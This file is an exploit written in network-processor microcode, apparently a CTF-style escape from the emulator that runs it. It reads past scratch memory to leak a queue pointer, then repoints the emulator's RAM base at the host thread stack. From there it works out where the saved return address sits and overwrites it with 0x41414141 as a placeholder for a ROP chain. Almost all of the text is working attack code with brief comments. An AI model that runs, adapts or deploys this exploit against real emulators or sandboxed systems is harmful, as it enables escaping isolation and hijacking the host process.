immed[reg_0, 0]
br!=ctx[reg_0, --, do_nothing]

// Read 8 bytes at 0x2834 bytes after m_scratch (so m_scratch+0xA0D)
immed[reg_0, 0]
immed[reg_1, 0xA0D]

scratch[read, read_0, reg_0, reg_1, 2] ctx_swap // read_0 and read_1 have m_scratch_queue_ptr

ld_field_w_clr[reg_2, 0b1111, read_0]
ld_field_w_clr[reg_3, 0b1111, read_1]

immed[reg_4, 0x280]

alu[reg_2, reg_2, -, reg_4] // m_scratch_queue - 0x280 is a pointer to the thread-local stack

// to actually write this out, we need to change m_ram to point to this value, and m_ram is m_scratch+0xA07
ld_field_w_clr[write_0, 0b1111, reg_2]
ld_field_w_clr[write_1, 0b1111, reg_3]

immed[reg_4, 0xA07]
scratch[write, write_0, reg_0, reg_4, 2] ctx_swap // change m_ram to point to m_scratch_queue - 0x280

ram[read, read_0, reg_0, reg_0, 2] ctx_swap // Need to read from ram twice to actually change it
ram[read, read_0, reg_0, reg_0, 2] ctx_swap // now read out what's at m_scratch_queue - 0x280: thread-local-stack-pointer

ld_field_w_clr[reg_2, 0b1111, read_0]
ld_field_w_clr[reg_3, 0b1111, read_1]

// load 0x801918 , which is offset to &saved_rip
immed[reg_4, 0x80, <<16]
immed_w0[reg_4, 0x1918]

alu[reg_2, reg_2, -, reg_4] // &saved_rip is @ thread-local-stack-pointer - 0x801918

ld_field_w_clr[write_0, 0b1111, reg_2]
ld_field_w_clr[write_1, 0b1111, reg_3]

immed[reg_4, 0xA07]
scratch[write, write_0, reg_0, reg_4, 2] ctx_swap // change m_ram to point to &saved_rip

// Now can do the ROP stuff, for now just write some As
immed[reg_4, 0x4141, <<16]
immed_w0[reg_4, 0x4141]

ld_field_w_clr[write_0, 0b1111, reg_4]
ld_field_w_clr[write_1, 0b1111, reg_4]

ram[read, read_0, reg_0, reg_0, 2] ctx_swap // need to do it twice to reload the address
ram[write, write_0, reg_0, reg_0, 2] ctx_swap // now overwrite the saved RIP
br[8191]


do_nothing:
immed[reg_0, 0]
immed[reg_1, 0]

do_nothing_loop:
scratch[read, read_0, reg_0, reg_1, 1] ctx_swap
br[do_nothing_loop]